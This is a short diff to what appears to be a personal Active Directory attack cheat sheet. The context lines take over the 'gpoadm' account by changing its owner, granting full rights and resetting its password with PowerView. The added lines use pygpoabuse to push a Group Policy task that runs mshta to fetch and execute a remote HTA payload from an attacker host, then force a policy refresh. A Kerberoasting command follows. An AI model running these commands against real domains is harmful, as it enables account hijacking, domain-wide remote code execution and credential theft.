@@ -577,6 +577,9 @@ Set-DomainObjectOwner -Identity gpoadm -OwnerIdentity Amelia.Griffiths
 Add-DomainObjectAcl -TargetIdentity gpoadm -PrincipalIdentity Amelia.Griffiths -Rights All
 Set-DomainUserPassword -Identity gpoadm -AccountPassword (ConvertTo-SecureString "123qweasdF!" -AsPlainText -Force)
 
+python3 pygpoabuse.py -dc-ip $TARGET $DOM/'gpoadm':'123qweasdF!' -gpo-id '31b2f340-016d-11d2-945f-00c04fb984f9' -command 'mshta http://10.8.5.79:8080/buqT7ygPVm.hta'
+gpoupdate /force
+
 Set-DomainObject -Identity $USERNAME -SET @{serviceprincipalname='SET/SET'}; Get-DomainSPNTicket -spn SET/SET
 
 # Pivoting
